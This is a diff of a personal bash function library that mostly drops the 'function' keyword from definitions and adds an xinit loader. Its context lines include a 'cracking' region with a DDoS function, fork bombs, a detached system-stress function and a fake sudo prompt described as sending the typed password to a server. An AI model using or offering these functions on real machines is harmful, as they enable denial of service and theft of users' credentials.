@@ -15,7 +15,7 @@
 # Note: get globals $ 2 * "TAB"
 
 # region generic
-function defaultArgumentsWrapperWithMinimumNumberOfArguments() {
+defaultArgumentsWrapperWithMinimumNumberOfArguments() {
     # Supports default arguments with a minimum number of arguments for functions
     # by wrapping them.
     #
@@ -23,7 +23,7 @@ function defaultArgumentsWrapperWithMinimumNumberOfArguments() {
     #
     # Runs "subProgram" with arguments "all", "--log-level" and "warning" if not
     # at least two arguments are given to "program".
-    # >>> function program() {
+    # >>> program() {
     # ...     echo subProgram \
     # ...         $(defaultArgumentsWrapperWithMinimumNumberOfArguments 3 2 \
     # ...         all --log-level warning $@)
@@ -47,7 +47,7 @@ function defaultArgumentsWrapperWithMinimumNumberOfArguments() {
         return $?
     fi
 }
-function defaultArgumentsWrapper() {
+defaultArgumentsWrapper() {
     # Wrapper function for
     # defaultArgumentsWrapperWithMinimumNumberOfArguments with second
     # parameter is setted to "1".
@@ -57,7 +57,7 @@ function defaultArgumentsWrapper() {
     # Runs "subProgram" with arguments "all", "--log-level" and "warning" if not
     # at least one arguments are given to "program".
     #
-    # >>> function program() {
+    # >>> program() {
     # ...     echo subProgram $(defaultArgumentsWrapper 3 all --log-level \
     # ...         warning $@)
     # ... }
@@ -74,7 +74,7 @@ function defaultArgumentsWrapper() {
 }
 # endregion
 # region cracking
-function makeSimpleDdosAttack() {
+makeSimpleDdosAttack() {
     # Makes a ddos attack to given host on given port. First argument: Number
     # of requests. Second argument: Port
     #
@@ -87,7 +87,7 @@ function makeSimpleDdosAttack() {
     done
     return $?
 }
-function stressSystem() {
+stressSystem() {
     # Stress system with given number of endless loops.
     #
     # Examples:
@@ -99,7 +99,7 @@ function stressSystem() {
     done
     return $?
 }
-function endlessLoop() {
+endlessLoop() {
     # Starts an endless loop.
     #
     # Examples:
@@ -110,7 +110,7 @@ function endlessLoop() {
     done
     return $?
 }
-function forkBomb() {
+forkBomb() {
     # Implementation for forkBomb. Note short version: :() { : | : & }; :
     #
     # Examples:
@@ -119,7 +119,7 @@ function forkBomb() {
     forkBomb | forkBomb &
     return $?
 }
-function stressSystemWithforkBomb() {
+stressSystemWithforkBomb() {
     # Runs a forkbomb in an endless loop. This is usefull if operating system
     # kills the whole process tree.
     #
@@ -131,7 +131,7 @@ function stressSystemWithforkBomb() {
     done
     return $?
 }
-function makeSystemUnattainable() {
+makeSystemUnattainable() {
     # Uses a stress system algorithm in its own process to avoid solving the
     # problem by process tree killing.
     #
@@ -141,7 +141,7 @@ function makeSystemUnattainable() {
     nohup bash --login -c stressSystem &>/dev/null &
     return $?
 }
-function fakeSudoPasswordAttempt() {
+fakeSudoPasswordAttempt() {
     # Shows a fake sudo password attempt.
     #
     # Examples:
@@ -156,7 +156,7 @@ function fakeSudoPasswordAttempt() {
     echo "sudo: $number incorrect password attempts"
     return $?
 }
-function grabSudoPassword() {
+grabSudoPassword() {
     # Shows a fake sudo password attempt and send to password to server.
     #
     # Examples:
@@ -187,7 +187,7 @@ function grabSudoPassword() {
 # endregion
 # region network
 alias restartNetwork='sudo ifdown -a &>/dev/null && sudo ifup -a &>/dev/null'
-function wlanStart() {
+wlanStart() {
     # Starts wlan functionality.
     #
     # Examples:
@@ -197,7 +197,7 @@ function wlanStart() {
     dhclient wlan0
     return $?
 }
-function wlanStop() {
+wlanStop() {
     # Stops wlan functionality.
     #
     # Examples:
@@ -208,7 +208,7 @@ function wlanStop() {
     killall dhclient3
     return $?
 }
-function wlanRestart() {
+wlanRestart() {
     # Restart wlan functionality.
     #
     # Examples:
@@ -220,7 +220,7 @@ function wlanRestart() {
 }
 # endregion
 # region system fixing
-function mountRootFileSystemWritable() {
+mountRootFileSystemWritable() {
     # If root file system is mounted as read only this command makes it
     # runnable.
     #
@@ -230,7 +230,7 @@ function mountRootFileSystemWritable() {
     mount -rw --options remount /
     return $?
 }
-function restoreGrub() {
+restoreGrub() {
     # Restores the linux boot-manager grub if it was overwritten (e.g. in
     # windows).
     #
@@ -249,7 +249,7 @@ function restoreGrub() {
     chroot /mnt grub-install /dev/sda
     return $?
 }
-function compileAndInstallWithoutRoot() {
+compileAndInstallWithoutRoot() {
     # Compiles and installs a program by its given source code. Your have to
     # be inside the source code folder tu run this function.
     #
@@ -270,7 +270,7 @@ function compileAndInstallWithoutRoot() {
 }
 # endregion
 # region tools
-function makeUEFIBootEntry() {
+makeUEFIBootEntry() {
     # Creates an uefi boot entry.
     #
     # Examples:
@@ -295,7 +295,7 @@ function makeUEFIBootEntry() {
     fi
     return $?
 }
-function backupBTRFSSystem() {
+backupBTRFSSystem() {
     # Create, delete or list system backups.
     #
     # Examples:
@@ -325,7 +325,7 @@ EOF
     fi
     return $?
 }
-function _backupBTRFSSystem() {
+_backupBTRFSSystem() {
     # Autocompletion function.
     local lastCompleteArgument="${COMP_WORDS[${COMP_CWORD}-1]}"
     local currentArgument="${COMP_WORDS[-1]}"
@@ -341,7 +341,7 @@ function _backupBTRFSSystem() {
 }
 complete -F _backupBTRFSSystem backupBTRFSSystem
 
-function sshScreen() {
+sshScreen() {
     # Wraps the ssh client for automatically starting a screen session on
     # server.
     #
@@ -351,7 +351,7 @@ function sshScreen() {
     ssh "$1" -t 'screen -r || screen -S main' "${@:2}"
     return $?
 }
-function runWithAppendedShebang() {
+runWithAppendedShebang() {
     # This function reads and returns the shebang from given file if exist.
     #
     # Examples:
@@ -397,7 +397,7 @@ function runWithAppendedShebang() {
     eval "$applicationRunCommand"
     return $?
 }
-function validateBashArgument() {
+validateBashArgument() {
     # Validates a given bash argument.
     #
     # Examples:
@@ -419,7 +419,7 @@ function validateBashArgument() {
     fi
     return $?
 }
-function overlayLocation() {
+overlayLocation() {
     # Mounts an overlay over given location. This could be useful if we have a
     # read only system caused by physical reasons.
     #
@@ -430,7 +430,7 @@ function overlayLocation() {
         lowerdir="$1",upperdir='/tmp/overlayDifferences' overlayfs "$1"
     return $?
 }
-function addDefaultUpstartService() {
+addDefaultUpstartService() {
     # Add a given start script to autostart and close scripts in an upstart
     # based system. Note that given script has to be located at "/etc/init.d/".
     #
@@ -442,7 +442,7 @@ function addDefaultUpstartService() {
     update-rc.d "$1" defaults
     return $?
 }
-function removeDefaultUpstartService() {
+removeDefaultUpstartService() {
     # Remove a given start script to autostart and close scripts in an upstart
     # based system. Note that given script has to be located at "/etc/init.d/".
     #
@@ -453,7 +453,7 @@ function removeDefaultUpstartService() {
     update-rc.d -f "$1" remove
     return $?
 }
-function calculatePercent() {
+calculatePercent() {
     # Calculates percent of second argument from the first argument.
     #
     # Examples:
@@ -464,7 +464,7 @@ function calculatePercent() {
         's/^(.)$/0\1/g' <<<$(((($2 * 10000) / $1) % 100)))"
     return $?
 }
-function prependVimModline() {
+prependVimModline() {
     # Prepend a vim modline to a text based file. Assumes that there exists a
     # function named "getVimModline" which prints appreciate modline for given
     # file path as first argument.
@@ -486,7 +486,7 @@ function prependVimModline() {
     cat "$tempFile" 1>"$1"
     return $?
 }
-function appendVimModline() {
+appendVimModline() {
     # Append a vim modline to a text based file. Assumes that there exists a
     # function named "getVimModline" which prints appreciate modline for given
     # file path as first argument.
@@ -498,7 +498,7 @@ function appendVimModline() {
     getVimModline "$2" 1>>"$1"
     return $?
 }
-function writeImageToBlockdevice() {
+writeImageToBlockdevice() {
     # Writes a given image to given blockdevice.
     #
     # Examples:
@@ -515,7 +515,7 @@ function writeImageToBlockdevice() {
     sudo dd bs=4M if="$source" of="$target"
     return $?
 }
-function writeBlockdeviceToImage() {
+writeBlockdeviceToImage() {
     # Writes a given backup from given blockdevice.
     #
     # Examples:
@@ -532,7 +532,7 @@ function writeBlockdeviceToImage() {
     sudo dd bs=4M if="$source" of="$target"
     return $?
 }
-function validateSEDReplacement() {
+validateSEDReplacement() {
     # This functions escapes every special meaning character for a sed
     # replacement.
     #
@@ -543,7 +543,7 @@ function validateSEDReplacement() {
         --expression 's/&/\\\&/g'
     return $?
 }
-function makeSingleExecutable() {
+makeSingleExecutable() {
     # Creates a bsd and virtually posix shell compatible single executable file
     # from an application directory.
     #
@@ -582,7 +582,7 @@ EOF
     return $?
 }
 # region pacman
-function showNotMaintainedByPacmanSystemFiles() {
+showNotMaintainedByPacmanSystemFiles() {
     # Shows all files which aren't maintained by pacman on currently running
     # system.
     #
@@ -619,7 +619,7 @@ Number of not maintained files: $numberOfNotMaintainedFiles $(calculatePercent $
 EOF
     return $?
 }
-function showConfigBackups() {
+showConfigBackups() {
     # Shows all config backups created by pacman.
     #
     # Examples:
@@ -634,7 +634,7 @@ function showConfigBackups() {
     return $?
 }
 # endregion
-function sendEMail() {
+sendEMail() {
     # Sends an email.
     #
     # Examples:
@@ -661,7 +661,7 @@ $2
 EOF
     return $?
 }
-function makeCommandPromtPrefix() {
+makeCommandPromtPrefix() {
     # Generates a new user prompt with useful runtime paramters.
     #
     # Examples:
@@ -691,7 +691,7 @@ function makeCommandPromtPrefix() {
     export PS1="$titleBar$errorPromt ${ILU_CYAN}${userName}${ILU_GRAY}@${ILU_CYAN}\h${ILU_BLUE} (${systemLoadAverage}) ${ILU_GRAY}\w${ILU_DEFAULT_COLOR}\n${gitBranch}${ILU_DARK_GRAY}> ${ILU_DEFAULT_COLOR}"
     return $?
 }
-function setMaxUserWatches() {
+setMaxUserWatches() {
     # Sets the maximum number of concurrent allowed file observations via
     # inotify.
     #
@@ -701,7 +701,7 @@ function setMaxUserWatches() {
     echo "$1" | sudo tee '/proc/sys/fs/inotify/max'_user_watches
     return $?
 }
-function makeSSHKey() {
+makeSSHKey() {
     # Generates a new ssh key.
     #
     # Examples:
@@ -717,7 +717,7 @@ function makeSSHKey() {
     ssh-keygen -t rsa -C "$user"
     return $?
 }
-function makeOpenSSLPemFile() {
+makeOpenSSLPemFile() {
     # Creates a concatenated pem file needed for server with https support.
     #
     # Examples:
@@ -739,7 +739,7 @@ function makeOpenSSLPemFile() {
     cat "${host}.key" "${host}.crt" 1>"${host}.pem"
     return $?
 }
-function findHardlinks() {
+findHardlinks() {
     # Finds same files as given file (hardlinks).
     #
     # Examples:
@@ -749,7 +749,7 @@ function findHardlinks() {
     sudo find / -samefile $1 2>/dev/null
     return $?
 }
-function makeCryptBlockdevice() {
+makeCryptBlockdevice() {
     # Creates encrypted blockdevices.
     #
     # Examples:
@@ -758,7 +758,7 @@ function makeCryptBlockdevice() {
     sudo cryptsetup -v --cipher aes-xts-plain64 --key-size 512 --hash sha512 \
         --iter-time 5000 --use-random luksFormat "$1"
 }
-function openCryptBlockdevice() {
+openCryptBlockdevice() {
     # Mounts encrypted blockdevices as analyseable blockdevice.
     #
     # Examples:
@@ -767,7 +767,7 @@ function openCryptBlockdevice() {
     sudo cryptsetup luksOpen "$1" "$2"
     return $?
 }
-function closeCryptBlockdevice() {
+closeCryptBlockdevice() {
     # Mounts encrypted blockdevices as analyseable blockdevice.
     #
     # Examples:
@@ -776,7 +776,7 @@ function closeCryptBlockdevice() {
     sudo cryptsetup luksClose "$1"
     return $?
 }
-function imagesToCSSClasses() {
+imagesToCSSClasses() {
     # This function converts a folder of images to a single includeable less
     # file.
     #
@@ -818,7 +818,7 @@ function imagesToCSSClasses() {
     done
     return $?
 }
-function mergeTextFiles() {
+mergeTextFiles() {
     # Concatenate files and print on the standard output.
     #
     # Examples:
@@ -876,7 +876,7 @@ function mergeTextFiles() {
     printf "$append"
     return $?
 }
-function openPath() {
+openPath() {
     # Opens a given path with a useful program.
     #
     # Examples:
@@ -894,7 +894,7 @@ function openPath() {
     done
     return $?
 }
-function showSymlinks() {
+showSymlinks() {
     # Shows symbolic links in current directory if no argument is provided or
     # in given location and their subdirectories (recursive).
     #
@@ -914,7 +914,7 @@ function showSymlinks() {
     done
     return $?
 }
-function translate() {
+translate() {
     # Translates a given string in a given (or automatic detected) language and
     # gives a translation in given language (German by default) back. Accesses
     # "http://translate.google.com" from terminal.
@@ -983,7 +983,7 @@ function translate() {
         return $?
     fi
 }
-function runInProgramsLocation() {
+runInProgramsLocation() {
     # Changes current working directory to given program path and runs the
     # program.
     #
@@ -1000,7 +1000,7 @@ function runInProgramsLocation() {
         return $?
     fi
 }
-function repairLinuxFilesystem() {
+repairLinuxFilesystem() {
     # Finds filesystem errors on linux based filesystem and repairs them.
     #
     # Examples:
@@ -1015,7 +1015,7 @@ function repairLinuxFilesystem() {
     sudo fsck -a "$target"
     return $?
 }
-function sshPrint() {
+sshPrint() {
     # Prints a file via ssh. A given printable file will be sent to a given
     # location via scp. The file be stored in remotes home directory with given
     # name. After this procedure a remote print order will be sent.
@@ -1075,7 +1075,7 @@ function sshPrint() {
         return $?
     fi
 }
-function unpack() {
+unpack() {
     # Unpack archives in various formats.
     #
     # Examples:
@@ -1125,7 +1125,7 @@ function unpack() {
         return $?
     fi
 }
-function pack() {
+pack() {
     # Packs archives.
     #
     # Examples:
@@ -1183,6 +1183,20 @@ function pack() {
 }
 # endregion
 # region handle display
+loadXINITSources() {
+    # This functions loads all xinit source scripts.
+    #
+    # Examples:
+    #
+    # >>> loadXINITSources
+    local xinitRCPath='/etc/X11/xinit/xinitrc.d' && \
+    if [ -d "$XINIT_RC_PATH" ]; then
+        for filePath in "${XINIT_RC_PATH}/"*; do
+            [ -x "$filePath" ] && source "$filePath"
+        done
+        unset filePath
+    fi
+}
 setWacomToLVDS1() {
     # This function maps wacom input devices to given rotation.
     #
@@ -1211,7 +1225,7 @@ setWacomToLVDS1() {
     done
     unset IFS
 }
-function rotateWacomDisplay() {
+rotateWacomDisplay() {
     # Rotates a wacom display orientation 180°
     #
     # Examples:
@@ -1293,7 +1307,7 @@ EOF
     setWacomToLVDS1 $_WACOM_ARG
     return $?
 }
-function switchFingerTouchWacomEnabled() {
+switchFingerTouchWacomEnabled() {
     # Toggles between enabled and disabled finger touch on wacom displays.
     #
     # Examples:
